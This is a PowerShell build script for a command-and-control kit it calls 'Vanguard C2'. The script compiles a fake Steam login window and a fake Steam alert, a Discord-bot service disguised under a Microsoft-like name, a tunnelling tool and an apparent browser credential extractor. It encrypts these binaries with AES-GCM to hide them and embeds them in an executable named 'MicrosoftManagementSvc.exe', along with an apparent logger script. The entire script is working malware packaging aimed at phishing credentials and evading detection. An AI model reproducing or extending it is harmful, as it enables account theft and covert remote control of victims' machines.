# Vanguard C2 Full Rebuild Script
$ErrorActionPreference = "Stop"

Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
try { Stop-Process -Name "MicrosoftManagementSvc" -Force -ErrorAction SilentlyContinue } catch {}
try { Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue } catch {}

# Clear old artifacts
Remove-Item -Path "dist", "build", "SteamLogin.spec", "discord_bot.spec" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
pyinstaller --noconfirm --onefile --icon="login\steam.ico" --add-data "login\steam_ui.html;." --add-data "login\steam.ico;." --add-data "login\logo.png;." --add-data "login\image.png;." --collect-all webview --collect-all cryptography --noupx --name "SteamLogin" "login\main_ui.py"
pyinstaller --noconfirm --onefile --noupx --name "MsDiscordSvc" "websocket\discord_bot.py"
pyinstaller --noconfirm --onefile --icon="login\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data="login\steam.ico;." --noupx --name "SteamAlert" "okoshko\steam_notice.py"

Write-Host "[*] Phase 3: Binary Encryption (AES-GCM AEAD)..." -ForegroundColor Cyan

# 1. Generate Keys
$MasterKeyBytes = New-Object byte[] 32
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($MasterKeyBytes)
$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKeyBytes)

$SessionKeyBytes = New-Object byte[] 32
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($SessionKeyBytes)
$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKeyBytes)

# 2. Key Wrap (Encrypt SessionKey with MasterKey) via Python
$EncryptedSessionKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()

Write-Host "    [+] Generated Master Key:     $($MasterKeyB64.Substring(0, 10))..." -ForegroundColor Green
Write-Host "    [+] Encrypted Session Key:    $($EncryptedSessionKeyB64.Substring(0, 10))..." -ForegroundColor DarkGreen

# 3. Update Constants.cs (Properly escape $ in replacement for Base64)
$ConstantsPath = "defense\Constants.cs"
$Content = Get-Content $ConstantsPath -Raw

$MasterPattern = 'public const string MASTER_KEY_B64 = ".*?";'
$MasterReplacement = "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
$Content = [regex]::Replace($Content, $MasterPattern, $MasterReplacement.Replace('$', '$$'))

$SessionPattern = 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";'
$SessionReplacement = "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
$Content = [regex]::Replace($Content, $SessionPattern, $SessionReplacement.Replace('$', '$$'))

Set-Content $ConstantsPath $Content

# 4. Encryption Loop
$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\MsDiscordSvc.exe", "dist\SteamAlert.exe", "tools\bore.exe", "tools\chromelevator.exe")
foreach ($file in $FilesToEncrypt) {
    if (Test-Path $file) {
        $binFile = $file -replace "\.exe", ".bin"
        # Always use a fresh copy for encryption to avoid double-encryption/stale artifacts
        Copy-Item -Path $file -Destination $binFile -Force
        
        # Use Python GCM Encryption Helper
        python scripts\encrypt_gcm.py encrypt $binFile $SessionKeyB64
        Write-Host "    [+] AES-GCM Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
        
        # Sync to root for C# embedding
        $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
        Copy-Item -Path $binFile -Destination $rootBin -Force
        Write-Host "    [+] Synced to root: $(Split-Path $rootBin -Leaf)" -ForegroundColor Gray
    } else {
        Write-Host "    [!] Warning: $file not found, skipping encryption." -ForegroundColor Yellow
    }
}

Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo

if ($LASTEXITCODE -eq 0) {
    $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
    $FinalExe = Join-Path $PublishDir "MicrosoftManagementSvc.exe"
    
    if (Test-Path "GlobalLogger.py") {
        Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
    }

    if (Test-Path "tools\bore.bin") {
        $ToolsDest = Join-Path $PublishDir "tools"
        New-Item -ItemType Directory -Path $ToolsDest -ErrorAction SilentlyContinue
        Copy-Item -Path "tools\bore.bin" -Destination $ToolsDest -Force
    }

    Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
    Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
} else {
    Write-Error "C# Build FAILED!"
}
